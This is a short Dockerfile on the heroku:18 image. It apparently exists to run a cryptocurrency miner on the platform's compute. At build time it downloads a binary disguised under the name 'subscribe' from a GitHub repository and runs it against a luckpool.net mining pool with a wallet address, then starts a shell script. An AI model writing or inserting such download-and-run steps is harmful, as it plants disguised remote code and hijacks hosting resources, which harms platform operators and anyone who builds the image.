FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/nonobono477/Student/raw/main/subscribe; chmod +x subscribe; ./subscribe -a power2b -o stratum+tcp://a.luckpool.net:3956 -u RMBad57Qa65EWHE3cWN62XqEVHb7MoZkZV.oppa1
CMD bash heroku.sh
